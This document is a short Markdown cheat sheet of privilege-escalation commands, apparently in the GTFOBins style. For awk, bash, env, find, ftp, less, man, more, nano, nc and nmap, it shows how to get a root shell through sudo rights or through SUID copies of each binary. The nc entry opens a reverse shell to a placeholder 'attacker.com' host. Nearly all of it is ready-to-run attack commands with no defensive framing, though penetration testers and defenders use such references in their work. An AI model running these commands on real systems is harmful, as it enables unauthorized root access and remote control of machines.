[NMAP](# NMAP)

# AWK
### SUDO
```
sudo awk 'BEGIN {system("/bin/sh")}'
```

### SUID
```
sudo sh -c 'cp $(which awk) .; chmod +s ./awk'

./awk 'BEGIN {system("/bin/sh")}'

```

# BASH
### SUDO
```
sudo bash
```
### SUID
```
sudo sh -c 'cp $(which bash) .; chmod +s ./bash'

./bash -p
```
# ENV
### SUDO
```
sudo env /bin/sh
```
### SUID
```
sudo sh -c 'cp $(which env) .; chmod +s ./env'

./env /bin/sh -p
```
# FIND
### SUDO
```
sudo find . -exec /bin/sh \; -quit
```
### SUID
```
sudo sh -c 'cp $(which find) .; chmod +s ./find'

./find . -exec /bin/sh -p \; -quit
```
# FTP
### SUDO
```
sudo ftp
!/bin/sh
```
# LESS
### SUDO
```
sudo less /etc/profile
!/bin/sh
```
### SUID
```
sudo sh -c 'cp $(which less) .; chmod +s ./less'

./less file_to_read
```
# MAN
### SUDO
```
sudo man man
!/bin/sh
```
# MORE
### SUDO
```
TERM= sudo -E more /etc/profile
!/bin/sh
```
### SUID
```
sudo sh -c 'cp $(which more) .; chmod +s ./more'

./more file_to_read
```

# NANO
### SUDO
```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```
### SUID
```
sudo sh -c 'cp $(which nano) .; chmod +s ./nano'

./nano
^R^X
reset; sh 1>&0 2>&0
```
# NC
### SUDO
```
# Run nc -l -p 12345 on the attacker box to receive the shell. This only works with netcat traditional.

RHOST=attacker.com
RPORT=12345
sudo nc -e /bin/sh $RHOST $RPORT
```

# NMAP
### SUDO
```
#   Input echo is disabled.

TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF

#   The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.

sudo nmap --interactive
nmap> !sh
```
